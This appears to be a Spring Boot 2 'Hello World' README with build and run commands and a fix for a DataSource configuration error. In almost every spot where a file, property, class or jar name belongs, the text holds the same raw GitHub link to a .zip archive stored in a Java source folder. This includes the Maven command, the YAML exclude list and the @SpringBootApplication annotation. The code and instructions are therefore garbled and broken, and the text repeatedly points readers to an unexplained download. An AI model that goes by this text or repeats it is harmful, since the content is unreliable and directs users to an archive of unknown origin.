# Spring Boot 2 Hello World

## Maven command
```
mvn archetype:generate https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip -DartifactId=hello-world -Dversion=1.0 -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
```

## Gradle command
```
gradle init --type pom
```
## Files
* [https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip](https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip)
* [https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip](https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip)
* Dependencies [https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip](https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip) (or) [https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip](https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip)

## Postman collection
* Refer [https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip](https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip)

## Exception
* Exception Description
```
Description:

Failed to configure a DataSource: 'url' attribute is not specified and no embedded datasource could be configured.

Reason: Failed to determine suitable jdbc url


Action:

Consider the following:
	If you want an embedded database (H2, HSQL or Derby), please put it on the classpath.
	If you have database settings to be loaded from a particular profile you may need to activate it (no profiles are currently active).
```
* Solution 1 - **disable the auto-configuration using the https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip property in our https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip file**
```
The class DataSourceAutoConfiguration is the base class for configuring a data source using the https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip* properties. 
Now, there are a few ways that we can exclude this from the auto-configuration. 
First, we can disable the auto-configuration using the https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip property in our https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip file.

https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip
```
*https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip
```
spring:
  autoconfigure:
    exclude:
    - https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip
```
* We can use the **exclude** attribute on our **@SpringBootApplication** or **@EnableAutoConfiguration** annotation:
```
@SpringBootApplication(exclude={https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip})
```

## Run using maven executive plugin
```
mvn clean compile exec:java
```

## Run using spring boot maven plugin
```
mvn clean compile spring-boot:run
```

## Run using spring boot gradle plugin
```
gradlew clean compileJava bootRun
```

## Create package using maven
```
mvn clean compile package
```

## Execute jar of Maven
```
java -jar target\https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip
```

## Create package using gradle
```
gradlew clean compileJava build
```

## Execute jar of Gradle
```
java -jar build\libs\https://raw.githubusercontent.com/thatavarthi-raj/hello/main/src/main/java/com/hello-3.4.zip
```# he-o
